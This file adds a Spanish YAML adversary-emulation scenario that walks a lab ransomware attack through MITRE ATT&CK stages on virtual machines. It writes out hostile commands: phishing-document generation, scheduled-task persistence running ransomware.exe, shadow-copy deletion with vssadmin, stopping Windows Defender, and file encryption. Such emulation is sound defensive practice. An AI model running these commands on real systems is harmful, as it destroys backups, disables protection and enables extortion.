@@ -1,0 +1,168 @@
+name: "Simulación de Ataque de Ransomware"
+description: "Este escenario simula un ataque completo de ransomware, desde la intrusión inicial hasta el cifrado de archivos y la extorsión."
+version: "1.0"
+
+# Técnicas MITRE ATT&CK utilizadas en este escenario
+techniques:
+  - id: "T1566.001"
+    name: "Phishing: Spearphishing Attachment"
+    description: "Envío de correo electrónico malicioso con archivo adjunto"
+    
+  - id: "T1204.002"
+    name: "User Execution: Malicious File"
+    description: "Ejecución de archivo malicioso por parte del usuario"
+    
+  - id: "T1059.003"
+    name: "Command and Scripting Interpreter: Windows Command Shell"
+    description: "Uso de cmd.exe para ejecutar comandos"
+    
+  - id: "T1053.005"
+    name: "Scheduled Task/Job: Scheduled Task"
+    description: "Creación de tarea programada para persistencia"
+    
+  - id: "T1082"
+    name: "System Information Discovery"
+    description: "Recopilación de información del sistema"
+    
+  - id: "T1083"
+    name: "File and Directory Discovery"
+    description: "Enumeración de archivos y directorios"
+    
+  - id: "T1486"
+    name: "Data Encrypted for Impact"
+    description: "Cifrado de datos para causar impacto"
+    
+  - id: "T1490"
+    name: "Inhibit System Recovery"
+    description: "Eliminación de copias de seguridad y puntos de restauración"
+    
+  - id: "T1489"
+    name: "Service Stop"
+    description: "Detención de servicios de seguridad y copias de seguridad"
+
+# Objetivos de la simulación
+targets:
+  - type: "vm"
+    value: "victim-windows"
+    description: "Máquina virtual Windows 10 objetivo"
+    
+  - type: "vm"
+    value: "attacker-kali"
+    description: "Máquina virtual Kali Linux para el atacante"
+
+# Prerrequisitos para ejecutar el escenario
+prerequisites:
+  - type: "command"
+    value: "vagrant"
+    description: "Vagrant debe estar instalado"
+    
+  - type: "command"
+    value: "virtualbox"
+    description: "VirtualBox debe estar instalado"
+    
+  - type: "file"
+    value: "tools/ransomware_simulator.py"
+    description: "Script simulador de ransomware"
+
+# Pasos del escenario
+steps:
+  - name: "Preparación del Entorno"
+    description: "Configuración del entorno de simulación"
+    techniques: []
+    commands:
+      - ["vagrant", "up", "victim-windows"]
+      - ["vagrant", "up", "attacker-kali"]
+    stop_on_failure: true
+    
+  - name: "Reconocimiento"
+    description: "Recopilación de información sobre el objetivo"
+    techniques:
+      - id: "T1595"
+        name: "Active Scanning"
+        commands:
+          - ["nmap", "-sV", "-p", "1-1000", "192.168.56.10"]
+          - ["enum4linux", "-a", "192.168.56.10"]
+    
+  - name: "Acceso Inicial"
+    description: "Obtención de acceso inicial al sistema objetivo"
+    techniques:
+      - id: "T1566.001"
+        name: "Phishing: Spearphishing Attachment"
+        commands:
+          - ["python3", "tools/generate_malicious_doc.py", "--output", "evil.doc"]
+          - ["python3", "tools/send_phishing_email.py", "--target", "user@victim", "--attachment", "evil.doc"]
+    
+  - name: "Ejecución"
+    description: "Ejecución de código malicioso en el sistema objetivo"
+    techniques:
+      - id: "T1204.002"
+        name: "User Execution: Malicious File"
+        commands:
+          - ["python3", "tools/simulate_user_execution.py", "--target", "192.168.56.10", "--file", "evil.doc"]
+      
+      - id: "T1059.003"
+        name: "Command and Scripting Interpreter: Windows Command Shell"
+        commands:
+          - ["python3", "tools/execute_remote_command.py", "--target", "192.168.56.10", "--command", "cmd.exe /c whoami"]
+    
+  - name: "Persistencia"
+    description: "Establecimiento de mecanismos de persistencia"
+    techniques:
+      - id: "T1053.005"
+        name: "Scheduled Task/Job: Scheduled Task"
+        commands:
+          - ["python3", "tools/create_scheduled_task.py", "--target", "192.168.56.10", "--name", "UpdateService", "--command", "C:\\malware\\ransomware.exe"]
+    
+  - name: "Descubrimiento"
+    description: "Recopilación de información sobre el sistema y la red"
+    techniques:
+      - id: "T1082"
+        name: "System Information Discovery"
+        commands:
+          - ["python3", "tools/execute_remote_command.py", "--target", "192.168.56.10", "--command", "systeminfo"]
+      
+      - id: "T1083"
+        name: "File and Directory Discovery"
+        commands:
+          - ["python3", "tools/execute_remote_command.py", "--target", "192.168.56.10", "--command", "dir /s C:\\Users"]
+    
+  - name: "Impacto"
+    description: "Cifrado de archivos y extorsión"
+    techniques:
+      - id: "T1490"
+        name: "Inhibit System Recovery"
+        commands:
+          - ["python3", "tools/execute_remote_command.py", "--target", "192.168.56.10", "--command", "vssadmin delete shadows /all /quiet"]
+      
+      - id: "T1489"
+        name: "Service Stop"
+        commands:
+          - ["python3", "tools/execute_remote_command.py", "--target", "192.168.56.10", "--command", "net stop \"Windows Defender Service\""]
+      
+      - id: "T1486"
+        name: "Data Encrypted for Impact"
+        commands:
+          - ["python3", "tools/ransomware_simulator.py", "--target", "192.168.56.10", "--directories", "C:\\Users\\victim\\Documents,C:\\Users\\victim\\Pictures"]
+    
+  - name: "Limpieza"
+    description: "Restauración del entorno a su estado original"
+    techniques: []
+    commands:
+      - ["python3", "tools/restore_environment.py", "--target", "192.168.56.10"]
+      - ["vagrant", "halt", "victim-windows"]
+      - ["vagrant", "halt", "attacker-kali"]
+
+# Configuración de informes
+reporting:
+  include_screenshots: true
+  include_logs: true
+  include_network_captures: true
+  include_mitre_mapping: true
+  
+# Configuración de seguridad
+safety:
+  sandbox_only: true
+  prevent_real_damage: true
+  prevent_data_exfiltration: true
+  prevent_lateral_movement: true
+
